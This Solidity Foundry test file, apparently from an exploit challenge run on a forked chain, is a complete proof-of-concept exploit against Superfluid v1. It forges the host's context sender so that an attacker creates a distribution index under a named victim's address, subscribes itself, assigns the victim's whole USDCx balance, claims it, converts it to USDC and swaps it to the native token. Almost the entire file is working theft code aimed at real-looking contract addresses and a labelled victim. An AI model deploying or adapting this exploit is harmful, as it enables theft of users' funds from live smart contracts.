// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {stdJson} from "forge-std/StdJson.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
    function getHost() external view returns (address);
    function downgrade(uint256 amount) external;
}

interface ISuperfluid {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(
        ISuperToken token,
        address publisher,
        uint32 indexId
    )
        external
        view
        returns (
            bool exist,
            uint128 indexValue,
            uint128 totalUnitsApproved,
            uint128 totalUnitsPending
        );

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    )
        external
        view
        returns (
            bool exist,
            bool approved,
            uint128 units,
            uint256 pendingDistribution
        );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/// @title Attempt1
/// @notice Hypothesis: Superfluid v1 on the ch4 fork still accepts a forged
///         `ctx.msgSender` when the fake ctx is kept in the ABI payload and the
///         Host's replacement hits a trailing empty bytes value instead.
/// @dev    The fork RPC returns empty historical `eth_getLogs` responses for
///         these SuperToken addresses even though historical balances resolve
///         correctly, so this attempt validates the exploit path against the
///         known USDCx victim from the challenge notes instead of a full holder
///         sweep. The run log records that limitation explicitly.
contract Attempt1 is Test {
    using stdJson for string;

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;

    uint256 constant FORK_BLOCK = 24_684_668;
    uint32 constant INDEX_SEED = 42_420_000;

    ISuperfluid constant HOST = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISuperToken constant USDCX = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IUniswapV2Router02 constant QUICKSWAP =
        IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    address constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;

    function setUp() public {
        vm.createSelectFork("ch4", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(USDCX), "USDCx");
        vm.label(address(USDC), "USDC");
    }

    function test_ctx_forgery_known_usdcx_victim() public {
        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);

        assertGt(address(HOST).code.length, 0, "host missing");
        assertGt(address(IDA).code.length, 0, "IDA missing");
        assertEq(USDCX.getHost(), address(HOST), "USDCx host mismatch");

        string memory victimJson = vm.readFile("recon/victims.json");
        console.log(
            "[preflight] USDCx touched holders from eth_getLogs:",
            victimJson.readUint(".summary.USDCx.touched_addresses")
        );

        uint256 victimBal = USDCX.balanceOf(KNOWN_USDCX_VICTIM);
        console.log("[preflight] known victim USDCx:", victimBal);
        assertGt(victimBal, 0, "known victim has no USDCx");

        vm.startPrank(ATTACKER);

        uint32 indexId = _findFreeIndexId(KNOWN_USDCX_VICTIM, INDEX_SEED);
        console.log("[state] chosen index id:", indexId);

        _callForged(
            abi.encodeCall(
                IDA.createIndex,
                (USDCX, indexId, _fakeContext(KNOWN_USDCX_VICTIM, IDA.createIndex.selector))
            ),
            "createIndex"
        );

        (bool exists,,,) = IDA.getIndex(USDCX, KNOWN_USDCX_VICTIM, indexId);
        assertTrue(exists, "forged index not created under victim");

        _callForged(
            abi.encodeCall(
                IDA.updateSubscription,
                (USDCX, indexId, ATTACKER, 1, _fakeContext(KNOWN_USDCX_VICTIM, IDA.updateSubscription.selector))
            ),
            "updateSubscription"
        );

        (bool subExists, bool approved, uint128 units,) =
            IDA.getSubscription(USDCX, KNOWN_USDCX_VICTIM, indexId, ATTACKER);
        console.log("[state] subscription exists:", subExists);
        console.log("[state] subscription approved:", approved);
        console.log("[state] subscription units:", units);
        assertTrue(subExists, "subscription missing");
        assertEq(units, 1, "unexpected units");

        _callForged(
            abi.encodeCall(
                IDA.updateIndex,
                (USDCX, indexId, uint128(victimBal), _fakeContext(KNOWN_USDCX_VICTIM, IDA.updateIndex.selector))
            ),
            "updateIndex"
        );

        (,,, uint256 pending) = IDA.getSubscription(USDCX, KNOWN_USDCX_VICTIM, indexId, ATTACKER);
        console.log("[state] pending distribution:", pending);

        _callPlain(
            abi.encodeCall(IDA.claim, (USDCX, KNOWN_USDCX_VICTIM, indexId, ATTACKER, new bytes(0))),
            "claim"
        );

        uint256 usdcxBal = USDCX.balanceOf(ATTACKER);
        console.log("[state] attacker USDCx after claim:", usdcxBal);
        assertGt(usdcxBal, 0, "claim produced no USDCx");

        USDCX.downgrade(usdcxBal);
        uint256 usdcBal = USDC.balanceOf(ATTACKER);
        console.log("[state] attacker USDC after downgrade:", usdcBal);
        assertGt(usdcBal, 0, "downgrade produced no USDC");

        bool approvedSwap = USDC.approve(address(QUICKSWAP), usdcBal);
        assertTrue(approvedSwap, "USDC approve failed");

        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = WMATIC;
        QUICKSWAP.swapExactTokensForETH(usdcBal, 0, path, ATTACKER, block.timestamp + 1);

        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.log("[delta] attacker native:", nativeAfter - nativeBefore);
        assertGt(nativeAfter, nativeBefore, "native balance must increase");
    }

    function _callForged(bytes memory inner, string memory step) internal {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        _callHost(abi.encodeCall(ISuperfluid.callAgreement, (IDA, outer, new bytes(0))), step);
    }

    function _callPlain(bytes memory inner, string memory step) internal {
        _callHost(abi.encodeCall(ISuperfluid.callAgreement, (IDA, inner, new bytes(0))), step);
    }

    function _callHost(bytes memory payload, string memory step) internal {
        (bool ok, bytes memory ret) = address(HOST).call(payload);
        if (!ok) {
            console.log("[revert] step:");
            console.log(step);
            console.logBytes(ret);
            revert(string.concat(step, ": ", _decodeRevert(ret)));
        }
    }

    function _fakeContext(address forgedSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(forgedSender, selector, "");
        return ContextUtils.encodeContext(ctx);
    }

    function _findFreeIndexId(address publisher, uint32 seed) internal view returns (uint32 id) {
        id = seed;
        for (uint256 i = 0; i < 256; ++i) {
            (bool exists,,,) = IDA.getIndex(USDCX, publisher, id);
            if (!exists) {
                return id;
            }
            unchecked {
                ++id;
            }
        }
        revert("no free index id");
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "silent revert";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
